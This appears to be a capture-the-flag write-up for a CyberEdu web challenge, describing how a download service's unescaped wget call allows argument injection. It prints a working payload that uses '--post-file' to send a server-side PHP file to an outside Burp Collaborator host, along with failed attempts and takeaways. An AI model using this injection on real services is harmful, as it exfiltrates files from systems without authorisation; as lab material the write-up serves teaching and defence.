---
title: "downloader-v1 — CyberEdu CTF"
description: "Abusing wget's argument injection to exfiltrate a PHP file via --post-file to Burp Collaborator."
pubDate: 2025-03-08
tags: ["web", "cyberedu", "command-injection"]
---

**Category:** Web
**Target:** `34.89.231.255:30694`

## Challenge

A file upload/download service. The download functionality uses `wget` under the hood.

## Discovery

After testing the download field, spaces in the URL weren't being escaped properly — injecting extra arguments into the `wget` call was possible.

## Attempts

**Tried:** Injecting `.php` extension via `-v` flag to bypass the sneaky file extension filter — files uploaded but PHP wasn't executed.

**Tried:** Inserting a `.htaccess` file to enable PHP execution — didn't work.

## Exploit

`wget` can send files via `--post-file`. Using this, I exfiltrated `flag.php` directly to a Burp Collaborator URL:

```
https://2dg6gkgn3ll0p5sl1psl7o58dzjq7f.burpcollaborator.net/test.jpg --post-file=../../flag.php -v
```

The server executed `wget` with my injected arguments, POSTed the contents of `flag.php` to my Collaborator instance, and I captured the flag in the incoming request.

## Takeaways

- Never pass user-controlled strings directly to shell commands like `wget`.
- Argument injection is as dangerous as command injection.
- `wget --post-file` is a useful exfiltration primitive in CTF scenarios.
- Burp Collaborator (or interactsh) is essential for out-of-band data exfiltration.
